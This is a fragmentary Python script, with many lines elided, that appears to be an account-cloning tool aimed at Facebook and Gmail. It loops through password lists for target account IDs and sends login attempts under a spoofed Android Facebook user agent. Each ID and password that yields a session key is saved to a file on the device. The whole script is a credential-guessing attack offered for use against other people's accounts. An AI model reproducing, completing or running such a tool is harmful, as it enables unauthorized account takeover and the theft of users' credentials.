...
def logo():
    print("""d88888b  .d8b.  d8888b.  .d8b.  d88888D 
...
print(f" [2] Owner Whatsapp ")
print(f" [3] Owner Facebook  ")
print(f" [4] Gmail Cloning")
print(f" [0] Exit")
...
def api(ids,names,passlist): 
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua_string = "Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/406.0.0.13.115;]"                                
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FARAZ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
